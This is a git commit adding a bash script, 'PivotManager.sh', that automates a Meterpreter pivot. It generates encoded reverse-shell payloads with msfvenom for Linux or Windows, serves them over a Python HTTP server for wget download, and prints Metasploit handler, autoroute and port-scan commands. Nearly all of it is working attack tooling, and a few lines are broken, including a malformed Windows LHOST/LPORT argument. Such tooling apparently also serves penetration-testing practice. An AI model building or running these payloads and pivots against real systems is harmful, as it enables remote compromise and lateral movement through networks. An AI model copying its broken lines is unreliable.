169e57d8a1b9a306ff7d62e82db53d98cd86d740
WillChaos <46702070+WillChaos@users.noreply.github.com>
2019-03-04 07:07:17 -0500

    Add files via upload

---
+++ Tools/PivotManager.sh
@@ -0,0 +1,62 @@
+#!/bin/bash
+
+#########################################################
+#    Simple manager to set up a Meterpreter pivot
+########################################################
+
+# set workiunug dir
+cd \tmp\
+
+# msfvenom generate payload
+read -p "[*] Linux or windows payload? (L/W): " payload
+read -p "[*] LHOST?: " lhost
+read -p "[*] LPORT? " lport
+	if [ "$payload" == "L" ];then
+   		msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -b "\x00" -e x86/shikata_ga_nai -f elf -o  /tmp/msf-chaos.elf
+		echo "-[*] Linux meterpreter payload saved: /tmp/msf-chaos.elf"
+	elif [ "$payload" == "W" ];then
+   		msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost=$lport -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/msf-chaos.exe
+		echo "-[*] Windows meterpreter payload saved: /tmp/msf-chaos.exe"
+
+	else
+   	echo "-[!] ERROR: Pass L or W for the payload type"
+        exit
+	fi
+
+# set up http listerner
+echo "[*] starting http listerner for direct wget of payload"
+	python -m SimpleHTTPServer 6677 &> /dev/null &
+	if [ "$payload" == "L" ];then
+echo   "-[*] direct download staged
+        ================================================
+        wget http://$lhost:6677/msf-chaos.elf
+        =================================================
+	"
+        else
+echo   "-[*] direct download staged
+        ==================================================
+        wget http://$lhost:6677/msf-chaos.exe
+        ==================================================
+        "
+	fi
+
+# set up msf listerner
+echo "[*] Configuring MSFConsole"
+echo "===========================use the below==========================="
+echo "
+     |	use exploit/multi/handler
+     |	set LHOST $lhost
+     |	set LPORT $lport
+     |	set ExitOnSession false
+     |  lin: set PAYLOAD linux/x86/shell/reverse_tcp
+     |  win: set payload windows/shell/reverse_tcp
+     |  exploit -j -z
+     "
+echo "==================================================================="
+echo "         once meterpreter is connected use the following
+     |
+     | set up pivot:     run autoroute -s 10.1.13.0/24 (change subnet)
+     | remot scan  :     use auxiliary/scanner/portscan/tcp (see options)
+     "
+echo "==================================================================="
+msfconsole
